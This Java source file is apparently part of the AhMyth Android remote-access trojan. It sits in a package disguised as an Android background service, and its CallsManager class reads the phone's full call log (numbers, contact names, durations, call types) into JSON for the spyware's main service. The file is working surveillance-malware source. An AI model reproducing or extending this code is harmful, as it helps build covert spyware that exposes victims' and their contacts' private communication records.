package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import com.android.background.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/11/16.
 */

public class CallsManager {

    public static JSONObject getCallsLogs() {
        Cursor cur = null;
        try {
            JSONObject Calls = new JSONObject();
            JSONArray list = new JSONArray();

            Uri allCalls = CallLog.Calls.CONTENT_URI;

            cur = MainService.getContextOfApplication().getContentResolver().query(
                    allCalls, null, null, null, null
            );

            if (cur == null) return null;

            while (cur.moveToNext()) {
                JSONObject call = new JSONObject();

                int numIdx = cur.getColumnIndex(CallLog.Calls.NUMBER);
                int nameIdx = cur.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int durIdx = cur.getColumnIndex(CallLog.Calls.DURATION);
                int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);

                String num = numIdx >= 0 ? cur.getString(numIdx) : "";
                String name = nameIdx >= 0 ? cur.getString(nameIdx) : "";
                String duration = durIdx >= 0 ? cur.getString(durIdx) : "0";
                int type = typeIdx >= 0 ? Integer.parseInt(cur.getString(typeIdx)) : 0;

                call.put("phoneNo", num);
                call.put("name", name != null ? name : "");
                call.put("duration", duration != null ? duration : "0");
                call.put("type", type);
                list.put(call);
            }
            Calls.put("callsList", list);
            return Calls;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        } finally {
            if (cur != null && !cur.isClosed()) {
                cur.close();
            }
        }
    }

}
